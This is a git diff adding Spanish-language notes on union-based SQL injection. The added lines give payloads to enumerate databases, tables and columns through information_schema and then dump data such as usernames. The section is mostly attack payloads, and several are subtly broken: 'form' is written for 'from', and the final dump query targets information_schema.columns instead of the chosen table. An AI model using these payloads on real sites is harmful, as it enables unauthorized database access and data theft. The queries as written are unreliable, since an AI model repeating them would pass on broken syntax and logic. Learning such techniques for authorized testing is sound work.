@@ -44,7 +44,19 @@ Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
 Una vez ya hemos identificado las columnas debemos probar con un
-`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, al no devolvernos er
+`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, al no devolvernos error podemos buscar en otra tabla
+
+Buscar las bases de datos disponibles
+`' union select NULL,schema_name form information_schema.schemata-- -` nos muestra las bases de datos
+
+Usar una base de datos que nos interesa y mostrar sus tablas
+`' union select NULL,table_name form information_schema.tables where table_schema='nombrebbdd'-- -`
+
+Ver las columnas de la tabla que nos interesa
+`' union select NULL,column_name form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`
+
+Ver datos de las columnas de la tabla seleccionada
+`' union select username,p form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`
 
 
 ## Listar contenido de las bases de datos
